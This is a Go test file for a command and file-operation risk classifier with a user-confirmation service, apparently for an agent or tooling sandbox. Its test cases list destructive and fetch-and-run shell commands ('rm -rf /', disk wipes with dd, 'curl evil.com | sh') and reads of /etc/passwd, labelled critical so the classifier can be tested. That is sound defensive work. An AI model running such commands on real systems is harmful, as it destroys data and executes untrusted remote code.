package security

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestRiskLevel_String(t *testing.T) {
	testCases := []struct {
		risk     RiskLevel
		expected string
	}{
		{RiskLow, "LOW"},
		{RiskMedium, "MEDIUM"},
		{RiskHigh, "HIGH"},
		{RiskCritical, "CRITICAL"},
		{RiskLevel(999), "UNKNOWN"}, // Test unknown risk level
	}
	
	for _, tc := range testCases {
		t.Run(tc.expected, func(t *testing.T) {
			result := tc.risk.String()
			if result != tc.expected {
				t.Errorf("Expected %s, got %s", tc.expected, result)
			}
		})
	}
}

func TestNewConfirmationService(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	provider := NewConsoleConfirmationProvider()
	
	service := NewConfirmationService(provider, policy)
	
	if service.provider != provider {
		t.Error("Provider not set correctly")
	}
	
	if service.policy != policy {
		t.Error("Policy not set correctly")
	}
}

func TestConfirmationService_AssessCommandRisk(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	provider := NewConsoleConfirmationProvider()
	service := NewConfirmationService(provider, policy)
	
	testCases := []struct {
		command      string
		expectedRisk RiskLevel
	}{
		// Critical risk
		{"rm -rf /", RiskCritical},
		{"dd if=/dev/zero of=/dev/sda", RiskCritical},
		{"curl evil.com | sh", RiskCritical},
		{"wget malware.com | bash", RiskCritical},
		
		// High risk
		{"git reset --hard HEAD~10", RiskHigh},
		{"git clean -fd", RiskHigh},
		{"npm publish", RiskHigh},
		{"chmod 777 /etc", RiskHigh},
		
		// Medium risk
		{"git push origin main", RiskMedium},
		{"npm install suspicious-package", RiskMedium},
		{"make install", RiskMedium},
		{"chmod 644 file.txt", RiskMedium},
		
		// Low risk
		{"ls -la", RiskLow},
		{"cat file.txt", RiskLow},
		{"git status", RiskLow},
		{"echo hello", RiskLow},
	}
	
	for _, tc := range testCases {
		t.Run(tc.command, func(t *testing.T) {
			risk := service.assessCommandRisk(tc.command)
			if risk != tc.expectedRisk {
				t.Errorf("Expected risk %s for command '%s', got %s", 
					tc.expectedRisk.String(), tc.command, risk.String())
			}
		})
	}
}

func TestConfirmationService_AssessFileOperationRisk(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	provider := NewConsoleConfirmationProvider()
	service := NewConfirmationService(provider, policy)
	
	testCases := []struct {
		operation    string
		path         string
		expectedRisk RiskLevel
	}{
		// Critical paths
		{"read", "/etc/passwd", RiskCritical},
		{"write", "/sys/kernel/debug", RiskCritical},
		{"edit", "/proc/version", RiskCritical},
		
		// High risk operations
		{"delete", "/home/user/important.txt", RiskHigh},
		{"remove", "/tmp/data", RiskHigh},
		
		// Medium risk system paths
		{"read", "/usr/local/bin/script", RiskMedium},
		{"write", "/var/log/app.log", RiskMedium},
		{"edit", "/opt/app/config.ini", RiskMedium},
		
		// Low risk user paths
		{"read", "/home/user/document.txt", RiskLow},
		{"write", "/home/user/project/file.go", RiskLow},
		{"edit", "./local_file.txt", RiskLow},
	}
	
	for _, tc := range testCases {
		t.Run(tc.operation+"_"+tc.path, func(t *testing.T) {
			risk := service.assessFileOperationRisk(tc.operation, tc.path)
			if risk != tc.expectedRisk {
				t.Errorf("Expected risk %s for operation '%s' on '%s', got %s", 
					tc.expectedRisk.String(), tc.operation, tc.path, risk.String())
			}
		})
	}
}

// MockConfirmationProvider for testing without user interaction
type MockConfirmationProvider struct {
	responses     map[string]bool
	defaultResult bool
	available     bool
}

func NewMockConfirmationProvider(defaultResult bool) *MockConfirmationProvider {
	return &MockConfirmationProvider{
		responses:     make(map[string]bool),
		defaultResult: defaultResult,
		available:     true,
	}
}

func (m *MockConfirmationProvider) SetResponse(commandPattern string, approved bool) {
	m.responses[commandPattern] = approved
}

func (m *MockConfirmationProvider) SetAvailable(available bool) {
	m.available = available
}

func (m *MockConfirmationProvider) RequestConfirmation(req ConfirmationRequest) (ConfirmationResponse, error) {
	// Check for specific responses first
	for pattern, approved := range m.responses {
		if req.Command != "" && strings.Contains(req.Command, pattern) {
			return ConfirmationResponse{
				ID:        req.ID,
				Approved:  approved,
				Option:    func() string { if approved { return "Allow" } else { return "Deny" } }(),
				Timestamp: time.Now(),
			}, nil
		}
	}
	
	// Use default result
	return ConfirmationResponse{
		ID:        req.ID,
		Approved:  m.defaultResult,
		Option:    func() string { if m.defaultResult { return "Allow" } else { return "Deny" } }(),
		Timestamp: time.Now(),
	}, nil
}

func (m *MockConfirmationProvider) IsAvailable() bool {
	return m.available
}

func TestConfirmationService_RequestCommandConfirmation(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	t.Run("no_confirmation_needed", func(t *testing.T) {
		provider := NewMockConfirmationProvider(false) // Default to deny
		service := NewConfirmationService(provider, policy)
		
		// Safe command that doesn't require confirmation
		confirmed, err := service.RequestCommandConfirmation("ls -la")
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if !confirmed {
			t.Error("Safe command should be auto-approved")
		}
	})
	
	t.Run("confirmation_approved", func(t *testing.T) {
		provider := NewMockConfirmationProvider(false) // Default to deny
		provider.SetResponse("git push", true)         // But approve git push
		service := NewConfirmationService(provider, policy)
		
		confirmed, err := service.RequestCommandConfirmation("git push origin main")
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if !confirmed {
			t.Error("Command with specific approval should be confirmed")
		}
	})
	
	t.Run("confirmation_denied", func(t *testing.T) {
		provider := NewMockConfirmationProvider(false) // Default to deny
		service := NewConfirmationService(provider, policy)
		
		confirmed, err := service.RequestCommandConfirmation("git reset --hard")
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if confirmed {
			t.Error("Command should be denied by default")
		}
	})
}

func TestConfirmationService_RequestFileOperationConfirmation(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	t.Run("low_risk_operation", func(t *testing.T) {
		provider := NewMockConfirmationProvider(false) // Default to deny
		service := NewConfirmationService(provider, policy)
		
		details := map[string]interface{}{"size": 1024}
		
		// Low risk operations should not require confirmation
		confirmed, err := service.RequestFileOperationConfirmation("read", "/home/user/file.txt", details)
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if !confirmed {
			t.Error("Low risk file operation should be auto-approved")
		}
	})
	
	t.Run("high_risk_operation_approved", func(t *testing.T) {
		provider := NewMockConfirmationProvider(true) // Default to approve
		service := NewConfirmationService(provider, policy)
		
		details := map[string]interface{}{"size": 1024}
		
		confirmed, err := service.RequestFileOperationConfirmation("delete", "/home/user/important.txt", details)
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if !confirmed {
			t.Error("High risk operation should be confirmed when provider approves")
		}
	})
	
	t.Run("high_risk_operation_denied", func(t *testing.T) {
		provider := NewMockConfirmationProvider(false) // Default to deny
		service := NewConfirmationService(provider, policy)
		
		details := map[string]interface{}{"size": 1024}
		
		confirmed, err := service.RequestFileOperationConfirmation("delete", "/home/user/important.txt", details)
		if err != nil {
			t.Errorf("Unexpected error: %v", err)
		}
		
		if confirmed {
			t.Error("High risk operation should be denied when provider denies")
		}
	})
}

func TestConsoleConfirmationProvider_IsAvailable(t *testing.T) {
	provider := NewConsoleConfirmationProvider()
	
	// This test is environment dependent
	// In a real terminal, IsAvailable() should return true
	// In test environment, it might return false
	available := provider.IsAvailable()
	
	// We can't assert a specific value since it depends on test environment
	// But we can ensure the method doesn't panic
	_ = available
}

func TestConfirmationRequest_Structure(t *testing.T) {
	req := ConfirmationRequest{
		ID:        "test-123",
		Title:     "Test Confirmation",
		Message:   "Please confirm this test operation",
		Command:   "test command",
		Details:   map[string]interface{}{"key": "value"},
		RiskLevel: RiskMedium,
		Timeout:   30 * time.Second,
		Options:   []string{"Allow", "Deny"},
		DefaultOpt: "Deny",
		Timestamp: time.Now(),
	}
	
	// Verify all fields are accessible
	if req.ID != "test-123" {
		t.Error("ID not set correctly")
	}
	
	if req.RiskLevel != RiskMedium {
		t.Error("RiskLevel not set correctly")
	}
	
	if len(req.Options) != 2 {
		t.Error("Options not set correctly")
	}
	
	if req.Details["key"] != "value" {
		t.Error("Details not set correctly")
	}
}

// Benchmark tests for performance
func BenchmarkSecurityPolicy_ValidateCommand(b *testing.B) {
	policy := NewSecurityPolicy(Standard)
	command := "ls -la /home/user"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		policy.ValidateCommand(command)
	}
}

func BenchmarkSecurityPolicy_ValidatePath(b *testing.B) {
	policy := NewSecurityPolicy(Standard)
	path := "/home/user/project/file.txt"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		policy.ValidatePath(path)
	}
}

func BenchmarkResourceMonitor_StartEndOperation(b *testing.B) {
	limits := DefaultResourceLimits()
	limits.MaxTotalOperations = int64(b.N + 100) // Allow enough operations for benchmark
	monitor := NewResourceMonitor(limits)
	defer monitor.Stop()
	
	metadata := map[string]interface{}{"benchmark": true}
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		opID := fmt.Sprintf("bench-op-%d", i)
		op, err := monitor.StartOperation(opID, "benchmark", metadata)
		if err != nil {
			b.Fatalf("Failed to start operation: %v", err)
		}
		monitor.EndOperation(opID)
		
		// Verify context cancellation doesn't block
		select {
		case <-op.Context.Done():
		default:
			// Context might not be cancelled immediately, that's OK for benchmark
		}
	}
}